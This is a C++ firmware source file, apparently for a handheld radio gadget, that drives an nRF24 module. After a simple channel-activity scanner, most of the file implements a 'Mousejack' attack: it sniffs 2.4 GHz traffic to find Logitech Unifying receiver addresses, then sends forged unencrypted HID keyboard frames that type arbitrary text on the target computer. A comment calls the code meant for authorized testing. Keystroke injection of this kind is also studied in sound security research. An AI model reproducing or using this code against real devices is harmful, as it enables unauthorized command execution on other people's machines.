#include "NrfModule.h"
#include "core/Logger.h"
#include "hal/SpiBus.h"
#include "hal/board_pins.h"
#include "ui/UIManager.h"
#include <RF24.h>

static const char* TAG = "Nrf";

static RF24 s_radio(PIN_NRF_CE, PIN_NRF_CSN);

NrfModule* NrfModule::_self = nullptr;

bool NrfModule::init() {
    _self = this;
    // CE/CSN на пинах 43/44 — общий QWIIC-порт (GPS/NRF24/iButton). НЕ трогаем
    // их при загрузке (иначе затираем GPS/iButton). RF24 поднимаем лениво в
    // acquire() при заходе на экран NRF/Mousejack, освобождаем в release().
    LOGI(TAG, "NRF24 ready (lazy on QWIIC)");
    return true;
}

void NrfModule::acquire() {
    if (_begun) return;
    hal::SpiBusGuard guard;
    bool ok = s_radio.begin(&UIManager::instance().display().spi());
    _present = ok && s_radio.isChipConnected();
    if (_present) {
        s_radio.setAutoAck(false);
        s_radio.disableCRC();
        s_radio.setDataRate(RF24_1MBPS);
        s_radio.startListening();
        s_radio.stopListening();
        LOGI(TAG, "NRF24 up");
    } else {
        LOGW(TAG, "NRF24 not detected");
    }
    _begun = true;
}

void NrfModule::release() {
    if (!_begun) return;
    pinMode(PIN_NRF_CE,  INPUT);   // освобождаем общий QWIIC-порт
    pinMode(PIN_NRF_CSN, INPUT);
    _begun = false;
    _present = false;
}

void NrfModule::resetScan() {
    memset(_activity, 0, sizeof(_activity));
}

void NrfModule::scanPass() {
    if (!_present) return;
    hal::SpiBusGuard guard;
    for (int ch = 0; ch < kChannels; ++ch) {
        s_radio.setChannel(ch);
        s_radio.startListening();
        delayMicroseconds(140);
        s_radio.stopListening();
        if (s_radio.testCarrier() && _activity[ch] < 99) _activity[ch]++;
    }
}

// ===========================================================================
//  Mousejack — HID-инъекция (для авторизованного тестирования)
//
//  Promiscuous-приём на nRF24 — приём с 2-байтным «адресом»-преамбулой; первые
//  5 байт полезной нагрузки трактуются как реальный адрес ESB-кадра. Это
//  «псевдопромискуитет» (BastilleResearch). Битовое выравнивание ESB зависит
//  от чипа — РАЗДЕЛ ТРЕБУЕТ ПОДСТРОЙКИ НА ЖЕЛЕЗЕ. Инъекция по найденному
//  адресу (Logitech Unifying unencrypted) — детерминирована.
// ===========================================================================

// Каналы, на которых обычно работают приёмники Logitech Unifying.
static const uint8_t MJ_CHANS[] = { 5, 8, 11, 14, 17, 20, 23, 26, 32, 35,
                                    41, 44, 47, 50, 53, 56, 59, 62, 65, 68,
                                    71, 74 };
static constexpr int MJ_CHANS_N = sizeof(MJ_CHANS);

void NrfModule::mjBeginRx(uint8_t ch) {
    s_radio.setAutoAck(false);
    s_radio.setDataRate(RF24_2MBPS);
    s_radio.disableCRC();
    s_radio.setPayloadSize(32);
    s_radio.setAddressWidth(2);
    // «Адрес» = преамбула ESB — ловим начало любого пакета.
    const uint8_t promisc[2] = { 0x00, 0xAA };
    s_radio.openReadingPipe(0, promisc);
    s_radio.setChannel(ch);
    s_radio.startListening();
}

int NrfModule::mjScan(uint32_t msPerSweep) {
    if (!_present) return 0;
    hal::SpiBusGuard guard;
    _mjCount = 0;

    const uint32_t perChan = msPerSweep / MJ_CHANS_N + 1;
    for (int ci = 0; ci < MJ_CHANS_N && _mjCount < kMaxDevices; ++ci) {
        mjBeginRx(MJ_CHANS[ci]);
        uint32_t t0 = millis();
        while (millis() - t0 < perChan) {
            if (!s_radio.available()) { delay(1); continue; }
            uint8_t buf[32] = {0};
            s_radio.read(buf, 32);
            // Кандидат-адрес = первые 5 байт; отбрасываем вырожденные.
            bool degenerate = true;
            for (int i = 1; i < 5; ++i) if (buf[i] != buf[0]) degenerate = false;
            if (degenerate || buf[0] == 0x00 || buf[0] == 0xFF) continue;

            // Дедуп по адресу.
            bool seen = false;
            for (int i = 0; i < _mjCount; ++i)
                if (memcmp(_mj[i].addr, buf, 5) == 0) { seen = true; break; }
            if (seen) continue;

            memcpy(_mj[_mjCount].addr, buf, 5);
            _mj[_mjCount].channel = MJ_CHANS[ci];
            _mjCount++;
            if (_mjCount >= kMaxDevices) break;
        }
        s_radio.stopListening();
    }
    LOGI(TAG, "mjScan: %d candidate device(s)", _mjCount);
    return _mjCount;
}

// Открыть TX на адрес (RF24 ждёт LSByte первым — разворачиваем).
static void mjOpenTx(RF24& r, const uint8_t addr[5], uint8_t ch) {
    uint8_t rev[5];
    for (int i = 0; i < 5; ++i) rev[i] = addr[4 - i];
    r.stopListening();
    r.setAutoAck(true);
    r.setRetries(1, 4);
    r.setDataRate(RF24_2MBPS);
    r.setCRCLength(RF24_CRC_16);          // Unifying — CRC16
    r.setAddressWidth(5);
    r.setChannel(ch);
    r.openWritingPipe(rev);
}

bool NrfModule::mjPing(const uint8_t addr[5], uint8_t& chOut) {
    if (!_present) return false;
    hal::SpiBusGuard guard;
    uint8_t ping = 0;   // 0-длинный ESB-ping (буфер ненулевой во избежание UB)
    for (int ci = 0; ci < MJ_CHANS_N; ++ci) {
        mjOpenTx(s_radio, addr, MJ_CHANS[ci]);
        if (s_radio.write(&ping, 0)) { chOut = MJ_CHANS[ci]; return true; }
    }
    return false;
}

bool NrfModule::mjSendFrame(const uint8_t* buf, uint8_t len) {
    return s_radio.write(buf, len);
}

// US ASCII -> (модификатор, HID usage). Возврат false для неподдерживаемых.
static bool mjAscii(char c, uint8_t& mod, uint8_t& usage) {
    mod = 0; usage = 0;
    if (c >= 'a' && c <= 'z') { usage = 0x04 + (c - 'a'); return true; }
    if (c >= 'A' && c <= 'Z') { usage = 0x04 + (c - 'A'); mod = 0x02; return true; }
    if (c >= '1' && c <= '9') { usage = 0x1E + (c - '1'); return true; }
    if (c == '0') { usage = 0x27; return true; }
    if (c == ' ') { usage = 0x2C; return true; }
    if (c == '\n'){ usage = 0x28; return true; }
    if (c == '.') { usage = 0x37; return true; }
    if (c == '-') { usage = 0x2D; return true; }
    if (c == '/') { usage = 0x38; return true; }
    if (c == ':') { usage = 0x33; mod = 0x02; return true; }
    return false;
}

int NrfModule::mjInject(const MjDevice& d, const String& text) {
    if (!_present) return 0;
    hal::SpiBusGuard guard;

    // Уточняем активный канал (устройства Unifying прыгают по каналам).
    uint8_t ch = d.channel;
    uint8_t found;
    if (mjPing(d.addr, found)) ch = found;
    mjOpenTx(s_radio, d.addr, ch);

    auto sendKey = [&](uint8_t mod, uint8_t usage) {
        // Logitech Unifying unencrypted keyboard frame (10 байт):
        // [0]=0x00 idx, [1]=0xC1 HID-клавиатура, [2]=mod, [3..8]=usages,
        // [9]=контрольная сумма (доп. до нуля суммы байт [0..8]).
        uint8_t f[10] = { 0x00, 0xC1, mod, usage, 0, 0, 0, 0, 0, 0 };
        uint8_t ck = 0; for (int i = 0; i < 9; ++i) ck += f[i];
        f[9] = (uint8_t)(0 - ck);
        mjSendFrame(f, sizeof(f));
        delay(5);
        // Отпускание клавиш.
        uint8_t r[10] = { 0x00, 0xC1, 0, 0, 0, 0, 0, 0, 0, 0 };
        uint8_t rk = 0; for (int i = 0; i < 9; ++i) rk += r[i];
        r[9] = (uint8_t)(0 - rk);
        mjSendFrame(r, sizeof(r));
        delay(5);
    };

    int sent = 0;
    for (size_t i = 0; i < text.length(); ++i) {
        uint8_t mod, usage;
        if (mjAscii(text[i], mod, usage)) { sendKey(mod, usage); sent++; }
    }
    LOGW(TAG, "mjInject: %d keys -> %02X:%02X:%02X:%02X:%02X ch%u", sent,
         d.addr[0], d.addr[1], d.addr[2], d.addr[3], d.addr[4], ch);
    return sent;
}
